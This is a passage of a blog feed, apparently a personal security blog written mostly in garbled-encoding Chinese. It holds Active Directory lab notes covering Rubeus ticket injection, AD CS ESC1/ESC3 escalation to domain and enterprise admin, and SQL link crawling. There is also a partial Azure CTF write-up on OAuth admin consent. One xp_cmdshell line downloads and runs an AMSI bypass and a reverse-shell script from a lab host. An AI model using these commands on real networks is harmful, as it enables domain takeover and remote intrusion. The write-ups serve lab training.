&lt;p&gt;ä½¿ç”¨ç°æœ‰ TGT å‘æŒ‡å®šåŸŸæ§è¯·æ±‚ &lt;code&gt;CIFS&lt;/code&gt; æœåŠ¡ç¥¨æ®å¹¶æ³¨å…¥å½“å‰ä¼šè¯ï¼Œå®ç°å¯¹è¿œç¨‹ä¸»æœºçš„ SMB è®¿é—®æ§åˆ¶ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\student226&amp;gt;C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIGFjCCBhKgAwIBBaEDAgEWo......
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ£€æŸ¥æƒé™&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\student226&amp;gt;dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp

11/16/2022  05:26 AM    &amp;lt;DIR&amp;gt;          .
11/15/2022  07:17 AM                29 secret.txt
               1 File(s)             29 bytes
               1 Dir(s)   7,382,794,240 bytes free
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;AD CS&lt;/h2&gt;
&lt;p&gt;æ£€æŸ¥åŸŸçš„AD CS&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Certify.exe cas
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ—å‡ºå½“å‰ç¯å¢ƒä¸­å®¹æ˜“è¢«æ»¥ç”¨çš„è¯ä¹¦æ¨¡æ¿&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Certify.exe find
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Certificate Request Agent æ¨¡æ¿ï¼šæ‹¥æœ‰è¿™ä¸ªæ¨¡æ¿è¯ä¹¦çš„ç”¨æˆ·å¯ä»¥ä»£è¡¨åˆ«äºº&lt;strong&gt;ç”³è¯·è¯ä¹¦&lt;/strong&gt;ï¼ˆæ¯”å¦‚ä»£è¡¨ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·å»ç”³è¯·å¸¦æœ‰å…¶èº«ä»½ä¿¡æ¯çš„è¯ä¹¦ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;Extended Key Usage (EKU)&lt;/p&gt;
&lt;h4&gt;ESC1&lt;/h4&gt;
&lt;p&gt;ä½¿ç”¨ESC1ææƒåˆ°DA&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# åˆ—å‡ºä»…æ˜¾ç¤ºé‚£äº›å…è®¸è¯·æ±‚è€…ï¼ˆenrolleeï¼‰è‡ªå®šä¹‰ Subject Nameï¼ˆä¸»ä½“åç§°ï¼‰ çš„æ¨¡æ¿ã€‚
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject

# å› ä¸ºæˆ‘ä»¬æ˜¯ dcorp\RDPUsers æˆå‘˜ï¼Œå¹¶ä¸”è¯¥ç»„å¯¹ HTTPSCertificates æ¨¡æ¿æ‹¥æœ‰ Enrollment æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªæ¨¡æ¿ä¼ªé€ åŸŸç®¡è¯ä¹¦è¿›è¡Œæƒé™æå‡ï¼Œè¯·æ±‚ä¸€ä¸ªåŸŸç®¡ç†å‘˜è¯ä¹¦ã€‚ï¼ˆæ­¤æ“ä½œç–‘ä¼¼ä¸èƒ½ç”¨æœ¬åœ°ç®¡ç†å‘˜èº«ä»½ï¼‰
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:&quot;HTTPSCertificates&quot; /altname:administrator

# å¤åˆ¶è¯ä¹¦å†…å®¹ä¿å­˜ä¸ºxxx.pem

# åˆ©ç”¨opensshå°†å…¶è½¬æ¢ä¸ºpfxæ ¼å¼
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out C:\AD\Tools\esc1-DA.pfx

# ä½¿ç”¨ä¸Šé¢çš„pfxå’ŒRubeosè¯·æ±‚DAçš„TGTï¼Œå¹¶æ³¨å…¥å½“å‰shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt

# æ£€æŸ¥æ˜¯å¦æœ‰DAæƒé™
winrs -r:dcorp-dc cmd /c set username
USERNAME=Administrator
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æå‡åˆ°EAï¼ˆä¼ä¸šç®¡ç†å‘˜ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# æ¸…é™¤ç¥¨æ®
klist purge

C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:&quot;HTTPSCertificates&quot; /altname:moneycorp.local\administrator

C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out C:\AD\Tools\esc1-EA.pfx

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt

# éªŒè¯
winrs -r:mcorp-dc cmd /c set username
USERNAME=Administrator
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ESC3&lt;/h4&gt;
&lt;p&gt;åˆ—å‡ºå½“å‰ç¯å¢ƒä¸­å®¹æ˜“è¢«æ»¥ç”¨çš„è¯ä¹¦æ¨¡æ¿&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Certify.exe find /vulnerable
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;SmartCardEnrollment-Agent æ¨¡æ¿çš„ç‰¹å¾&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Extended Key Usage (EKU)					Certificate Request Agent
æ‹¥æœ‰è¿™ä¸ªæ¨¡æ¿è¯ä¹¦çš„ç”¨æˆ·å¯ä»¥ä»£è¡¨åˆ«äººç”³è¯·è¯ä¹¦ï¼ˆæ¯”å¦‚ä»£è¡¨ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·å»ç”³è¯·å¸¦æœ‰å…¶èº«ä»½ä¿¡æ¯çš„è¯ä¹¦ï¼‰ã€‚

Authorized Signatures Required		0
æ²¡æœ‰ç­¾åé™åˆ¶ï¼Œå³æ”»å‡»è€…ä¸éœ€è¦è¢«æˆæƒå°±èƒ½ä½¿ç”¨ã€‚

Enrollment Rights									Domain Users
åªè¦ä½ æ˜¯ Domain Usersï¼Œå°±å¯ä»¥ç›´æ¥è·å–ä¸€ä¸ªèƒ½ä»£è¡¨ä»–äººç”³è¯·è¯ä¹¦çš„ä»£ç†è¯ä¹¦ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ—å‡ºæ‰€æœ‰æ¨¡æ¿&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools&amp;gt;C:\AD\Tools\Certify.exe find
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;SmartCardEnrollment-Users æ¨¡æ¿çš„ç‰¹å¾&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Extended Key Usage (EKU)					Client Authenticationï¼ˆåŸŸèº«ä»½éªŒè¯ï¼‰ã€EFSã€Secure Email
è¿™ä¸ªæ¨¡æ¿å…·æœ‰ç”¨äº**åŸŸèº«ä»½éªŒè¯ï¼ˆClient Authenticationï¼‰**çš„ EKUã€‚

Application Policies							Certificate Request Agent
åŒæ—¶ä¹Ÿæœ‰ä¸€ä¸ª Application Policy æ˜¯ Certificate Request Agentã€‚

Authorized Signatures Required		1
å®ƒçš„ä½¿ç”¨è¢«é™åˆ¶ä¸ºå¿…é¡»ç”±ä¸€ä¸ªæ‹¥æœ‰ â€œCertificate Request Agentâ€ è¯ä¹¦çš„äººä»£è¡¨ç”³è¯·ï¼ˆå³ç­¾åä¸€æ¬¡ï¼‰ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ç”¨&lt;strong&gt;SmartCardEnrollment-Agent&lt;/strong&gt; æ¨¡æ¿è·å–ä¸€ä¸ª &lt;strong&gt;ä»£ç†è¯ä¹¦&lt;/strong&gt;ï¼Œç„¶åå†ç”¨è¿™ä¸ªä»£ç†è¯ä¹¦ä»£è¡¨åˆ«äººï¼ˆæ¯”å¦‚åŸŸç®¡ç†å‘˜ï¼‰ç”³è¯· &lt;code&gt;SmartCardEnrollment-Users&lt;/code&gt; çš„èº«ä»½éªŒè¯è¯ä¹¦&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ESC3ææƒåˆ°DA&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent

C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out C:\AD\Tools\esc3-agent.pfx

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt

# éªŒè¯
winrs -r:dcorp-dc cmd /c set username
USERNAME=Administrator
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä½¿ç”¨ESC3ææƒåˆ°EA&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123

C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem  -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out C:\AD\Tools\esc3-EA.pfx

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;MS SQL&lt;/h2&gt;
&lt;p&gt;å¯¼å…¥PowerupSQL&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨æ•´ä¸ªåŸŸå†…æ‰«æå‘ç° SQL Server å®ä¾‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-SQLInstanceDomain

#æšä¸¾æ•´ä¸ªåŸŸå†…çš„ SQL Server å®ä¾‹ï¼Œå¹¶è·å–æ¯ä¸ªå®ä¾‹çš„è¯¦ç»†ä¿¡æ¯ï¼ˆå¦‚ç‰ˆæœ¬ã€é…ç½®ã€èº«ä»½éªŒè¯æ¨¡å¼ã€æƒé™ç­‰ï¼‰ã€‚

Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;éå† SQL Server é“¾æ¥æœåŠ¡å™¨é“¾è·¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose

Version     : SQL Server 2019
Instance    : EU-SQL20
CustomQuery : {USERNAME=SYSTEM, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL20.EU.EUROCORP.LOCAL}
User        : sa
Links       :
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¼¹shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query &apos;exec master..xp_cmdshell &apos;&apos;powershell -c &quot;iex (iwr -UseBasicParsing http://172.16.100.xx/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.xx/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.xx/Invoke-PowerShellTcpEx.ps1)&quot;&apos;&apos;&apos; -QueryTarget eu-sql20
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>WIZ Cloud Security CTF 2025 Challenge 3</title><link>https://25pm-sumio.github.io/posts/2025/12/14/01/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/2025/12/14/01/</guid><pubDate>Tue, 16 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Breaking The Barriers&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;As an APT group targeting Azure, you&apos;ve discovered a web app that creates admin users, but they are heavily restricted. To gain initial access, you&apos;ve created a malicious OAuth app in your tenant and now seek to deploy it into the victim&apos;s tenant. Can you bypass the restrictions and capture the flag?&lt;/p&gt;
&lt;p&gt;The shell environment has been preloaded with your malicious OAuth app credentials and the target web app endpoint as environment variables. Use &apos;env | grep AZURE&apos; or &apos;echo $WEB_APP_ENDPOINT&apos; to view them.&lt;/p&gt;
&lt;p&gt;Good luck!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å…³é”®ä¿¡æ¯é€å¥æ‹†ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;web app that creates admin users, but they are heavily restricted&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;å—å®³ç§Ÿæˆ·é‡Œç¡®å®æœ‰ç®¡ç†å‘˜ï¼Œä½†æƒé™è¢«é™åˆ¶&lt;/strong&gt;ï¼ˆå¸¸è§ï¼šä¸èƒ½åˆ›å»º Appã€ä¸èƒ½æ”¹ç›®å½•è®¾ç½®ï¼‰&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;you&apos;ve created a malicious OAuth app in your tenant&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç§Ÿæˆ·é‡Œå·²ç»æœ‰ä¸€ä¸ªæ¶æ„ App&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Client ID&lt;/li&gt;
&lt;li&gt;Client Secret&lt;/li&gt;
&lt;li&gt;Redirect URI&lt;/li&gt;
&lt;li&gt;æ‰€éœ€ Graph æƒé™ï¼ˆå¦‚ &lt;code&gt;Directory.ReadWrite.All&lt;/code&gt; / &lt;code&gt;RoleManagement.ReadWrite.Directory&lt;/code&gt; ç­‰ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;seek to deploy it into the victim&apos;s tenant&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;ç›®çš„æ˜¯è®©å—å®³ç§Ÿæˆ·â€œä¿¡ä»» / å®‰è£… / æˆæƒâ€ä½ çš„ OAuth App&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ ¹æ®é¢˜ç›®è¯´çš„çœ‹ä¸‹ç¯å¢ƒå˜é‡&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;env | grep AZURE
$WEB_APP_ENDPOINT
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/01.png&quot; alt=&quot;image-20251216215502362&quot; /&gt;&lt;/p&gt;
&lt;p&gt;åˆ°è¿™é‡Œæ„å›¾æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œå¤§æ¦‚ç‡åœ¨è€ƒAdmin Consent é’“é±¼ã€‚å³ä¾¿ç®¡ç†å‘˜æƒé™å—é™ï¼Œ&lt;strong&gt;åªè¦è¿˜èƒ½ç‚¹ Admin Consent é“¾æ¥&lt;/strong&gt;ï¼Œå°±å¯èƒ½ä¸­ã€‚å…³é”®ç‚¹ï¼š&lt;strong&gt;åˆ›å»º App â‰  ç»™ App æˆæƒ&lt;/strong&gt;ï¼Œå¾ˆå¤šâ€œå—é™ç®¡ç†å‘˜â€ ä¸èƒ½åˆ›å»ºåº”ç”¨ï¼Œä¸èƒ½ä¿®æ”¹ç§Ÿæˆ·è®¾ç½®ï¼Œä½† &lt;strong&gt;è¿˜èƒ½ç»™ç¬¬ä¸‰æ–¹ App ç‚¹ admin consent&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆå…ˆå°è¯•è®¿é—®ä¸€ä¸‹è¿™ä¸ªwebåº”ç”¨&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/02.png&quot; alt=&quot;image-20251216224559357&quot; /&gt;&lt;/p&gt;
&lt;p&gt;æ‹¿åˆ°äº†ä¸€ä¸ªæ‰€è°“çš„ç®¡ç†å‘˜è´¦å·ï¼Œå¹¶ä¸”ç»™äº†ä¸€ä¸ªé‚®ç®±sumio541@azurectfchallengegame.com&lt;/p&gt;
&lt;p&gt;æ‹¿å»ç™»å½•ä¸€ä¸‹è¯•è¯•&quot;https://entra.microsoft.com/&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/03.png&quot; alt=&quot;image-20251216232516335&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªè´¦å·è¢« Conditional Access / Auth Method é™åˆ¶äº†â€œæ­£å¸¸äº¤äº’å¼ç™»å½•â€ï¼Œä½†ä¸ç­‰äºè¿™ä¸ªè´¦å·æ²¡ç”¨æˆ–OAuth æˆæƒè¢«ç¦ï¼ŒWIZ åœ¨è¿™é‡Œæƒ³è€ƒä½  &lt;strong&gt;çœŸå®ä¼ä¸šç¯å¢ƒé‡Œçš„å¸¸è§é”™è¯¯é…ç½®&lt;/strong&gt;ï¼šå› ä¸ºå¾ˆå¤šç»„ç»‡ &lt;strong&gt;åªé™åˆ¶â€œäººâ€&lt;/strong&gt;ï¼Œå¿˜äº† &lt;strong&gt;â€œåº”ç”¨æˆæƒâ€&lt;/strong&gt;ã€‚è¢«é™åˆ¶çš„æ˜¯ä¸èƒ½ç™»å½• Azure Portalã€ä¸èƒ½ç”¨ç”¨æˆ·åå¯†ç  / æ™®é€šç½‘é¡µç™»å½•ã€ä¸èƒ½ç”¨ Entra UI æ“ä½œã€‚è¿™è¯´æ˜æˆ‘ä»¬å·²ç» &lt;strong&gt;æˆåŠŸåœ¨å—å®³ Azure ç§Ÿæˆ·é‡Œåˆ›å»ºäº†ä¸€ä¸ªç”¨æˆ·&lt;/strong&gt;ï¼Œä¸”è¿™ä¸ªç”¨æˆ· &lt;strong&gt;æ˜¯ç®¡ç†å‘˜è§’è‰²ï¼ˆä½†è¢«é™åˆ¶ï¼‰&lt;/strong&gt;ï¼Œè¿™æ˜¯ä¸€ä¸ª &lt;strong&gt;Entra ID / Azure AD çš„çœŸå®è´¦å·&lt;/strong&gt;ã€‚ä¹Ÿå°±æ˜¯è¯´ç°åœ¨æœ‰äº†èƒ½ç™»å½• Entra ID çš„å—é™ Admin èº«ä»½ï¼Œä½†å…³é”®ä¸æ˜¯â€œè¿™ä¸ª admin èƒ½å¹²ä»€ä¹ˆâ€ï¼Œè€Œæ˜¯ï¼š&lt;strong&gt;è¿™ä¸ª admin è¿˜èƒ½ã€Œç»™è°æˆæƒã€&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨æ¥æ„é€ &lt;strong&gt;Admin Consent URL&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://login.microsoftonline.com/{VICTIM_TENANT_ID}/adminconsent
  ?client_id={YOUR_CLIENT_ID}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;tenant ç”¨ &lt;strong&gt;å—å®³ç§Ÿæˆ·ID&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;client_id ç”¨ &lt;strong&gt;æˆ‘ä»¬æ¶æ„ App çš„&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¦‚æœä¸çŸ¥é“ victim tenant idï¼Œ&lt;strong&gt;web app å¾€å¾€èƒ½æ³„éœ²&lt;/strong&gt;(ä½†æ˜¯è¿™æ¬¡ä¸ç”¨ï¼Œç›´æ¥ç”¨organizations)ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/.well-known/openid-configuration&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;é”™è¯¯é¡µ&lt;/li&gt;
&lt;li&gt;token issuer&lt;/li&gt;
&lt;li&gt;response header&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;https://login.microsoftonline.com/organizations/adminconsent?client_id=f83cb3d7-47de-4154-be65-c85d697cdfd3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/04.png&quot; alt=&quot;image-20251217000253241&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¦æ±‚æˆ‘ä»¬è¿›è¡ŒMFAï¼Œè¿™è¯´æ˜è´¦å·å·²ç»è¢« Entra ID è¯†åˆ«ä¸ºâ€œæœ‰æ•ˆä¸»ä½“â€ï¼Œ&lt;/p&gt;
&lt;p&gt;æŸ¥ä¸€ä¸‹å—å®³ç§Ÿæˆ·id&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://login.microsoftonline.com/azurectfchallengegame.com/v2.0/.well-known/openid-configuration

d26f353d-c564-48e7-b26f-aa48c6eecd58
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/05.png&quot; alt=&quot;image-20251217001022983&quot; /&gt;&lt;/p&gt;
&lt;p&gt;æ„é€ å‘½ä»¤å°†ä¸´æ—¶å‡­è¯å…‘æ¢æˆ&lt;strong&gt;access_token&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -X POST https://login.microsoftonline.com/d26f353d-c564-48e7-b26f-aa48c6eecd58/oauth2/v2.0/token -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;client_id=$AZURE_CLIENT_ID&quot; -d &quot;client_secret=$AZURE_CLIENT_SECRET&quot; -d &quot;grant_type=client_credentials&quot; -d &quot;scope=https://graph.microsoft.com/.default&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/06.png&quot; alt=&quot;image-20251217001140364&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;eyJ0eXAiOiJKV1QiLCJub25jZSI6Ii13VDFVckp5UzhlZTBVZWpxTktXVkpJdXEzU1IzTXVCYXVyWkF3eEY0dDQiLCJhbGciOiJSUzI1NiIsIng1dCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyIsImtpZCI6InJ0c0ZULWItN0x1WTdEVlllU05LY0lKN1ZuYyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWF0IjoxNzY1OTAxMTgxLCJuYmYiOjE3NjU5MDExODEsImV4cCI6MTc2NTkwNTA4MSwiYWlvIjoiazJKZ1lQQytwVzVncWxQSkh6c2xRZTNRWFlGOEFBPT0iLCJhcHBfZGlzcGxheW5hbWUiOiJtYWxpY2lvdXMtb2F1dGgtYXBwIiwiYXBwaWQiOiJmODNjYjNkNy00N2RlLTQxNTQtYmU2NS1jODVkNjk3Y2RmZDMiLCJhcHBpZGFjciI6IjEiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9kMjZmMzUzZC1jNTY0LTQ4ZTctYjI2Zi1hYTQ4YzZlZWNkNTgvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiI5OTY2NzdmOC02OWYxLTQxNzEtYmUwMC0yMDdmM2UwNWZhZWMiLCJyaCI6IjEuQWE0QVBUVnYwbVRGNTBpeWI2cEl4dTdOV0FNQUFBQUFBQUFBd0FBQUFBQUFBQUE3QVFDdUFBLiIsInJvbGVzIjpbIkdyb3VwLlJlYWQuQWxsIiwiVXNlci5JbnZpdGUuQWxsIl0sInN1YiI6Ijk5NjY3N2Y4LTY5ZjEtNDE3MS1iZTAwLTIwN2YzZTA1ZmFlYyIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6ImQyNmYzNTNkLWM1NjQtNDhlNy1iMjZmLWFhNDhjNmVlY2Q1OCIsInV0aSI6ImpaQW9tSi1YTkV5R0lyOFlMUThZQUEiLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjA5OTdhMWQwLTBkMWQtNGFjYi1iNDA4LWQ1Y2E3MzEyMWU5MCJdLCJ4bXNfYWNkIjoxNzUzOTcxOTM3LCJ4bXNfYWN0X2ZjdCI6IjMgOSIsInhtc19mdGQiOiJZbW55SjZwdGFJR0xYbVhiT3Nzc2VHeUJSRFFrNWtJaFZCNWJwaEQ2TWNNQlpYVnliM0JsZDJWemRDMWtjMjF6IiwieG1zX2lkcmVsIjoiMTggNyIsInhtc19yZCI6IjAuNC1MZ1lCSmlXY2Y0bmtsSWhJTlZTT0NJZDlVMHJRcGR6NlZYMTc5WUhzb2REeFJsRnhLSUs1ZnRUQ3c1NkwxOE4wdlFwSzFLV1VCUlRpR0JsZS1fWHNpMTl2T2NIOHJkTG5scnJ3NVFsRU5JZ0prQkFnNUFhUUEiLCJ4bXNfc3ViX2ZjdCI6IjMgOSIsInhtc190Y2R0IjoxNzU1NTk2NTk0LCJ4bXNfdG50X2ZjdCI6IjMgMTYifQ.kl5JEOEolA8Rqf9eA85pTNBdq-M9HgAIiNHBKiYOrW_hDC7mohNETUsHOWSLbagzQGFP87VeyzW7IJZktpqC2jdsv_y1jwWeG0OFa7DyUALVSscaqLI-Onats9PE_74eUQD39W7_9TV0grZe0xuE98MtFMMp9cWw4WP0a2SY1YiCcNacn2Y3Cm6ZwLMYui66ns9YOFkzz2rxBZRBfknoA02rpB39cUI4yn-nH83NgnSl7G560RuKs74xioaVGR2DSXy2Gi2zDvG9Rv3c4d85A6mUvpBjxa0D_TMspJGpvamJ4Qn4cnHr0I5jFA7HghgZV_YK4tGNydf1g2zA3eTovQ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°ä¸€ä¸ªjwtçš„access_tokenï¼Œæ‹¿å»è§£å¯†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/07.png&quot; alt=&quot;image-20251217001915039&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°èƒ½è¯»å– &lt;strong&gt;æ‰€æœ‰ Azure AD Group&lt;/strong&gt;ï¼Œé‚€è¯· &lt;strong&gt;External / Guest User&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  &quot;roles&quot;: [
    &quot;Group.Read.All&quot;,
    &quot;User.Invite.All&quot;
  ],
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°è¯•è¯»ä¸€ä¸‹æ‰€æœ‰ç»„ï¼Œå‘ç°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -s \
  -H &quot;Authorization: Bearer $TOKEN&quot; \
  https://graph.microsoft.com/v1.0/groups | jq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/08.png&quot; alt=&quot;image-20251218163557680&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç›éƒ½ä¸å¸¦ç›çš„ï¼Œåå­—ç›´æ¥æŠŠflagæ‹è„¸ä¸Šäº†ã€‚åŠ¨æ€ç»„è¯´æ˜ &lt;strong&gt;flag ä¸æ˜¯é™æ€å†™æ­»çš„&lt;/strong&gt;ï¼Œè€Œæ˜¯é€šè¿‡æŸä¸ªæ¡ä»¶â€œè¢«èµ‹äºˆâ€ã€‚æˆå‘˜ç»„è§„åˆ™è§£é‡Šäº†è¿™ä¸ªæ¡ä»¶ï¼Œå³ï¼šåªè¦æ»¡è¶³ä»¥ä¸‹ä»»æ„ä¸€ä¸ªæ¡ä»¶ï¼Œå°±ä¼šè¢«è‡ªåŠ¨åŠ å…¥è¿™ä¸ªâ€œflag è®¿é—®ç»„â€ï¼›&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å†…éƒ¨å‘˜å·¥ï¼šFinance + Manager&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;è®¿å®¢ç”¨æˆ·ï¼ˆGuestï¼‰ï¼Œä¸” displayName ä»¥ &lt;code&gt;CTF&lt;/code&gt; å¼€å¤´&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;city = Seattle&lt;/li&gt;
&lt;/ul&gt;
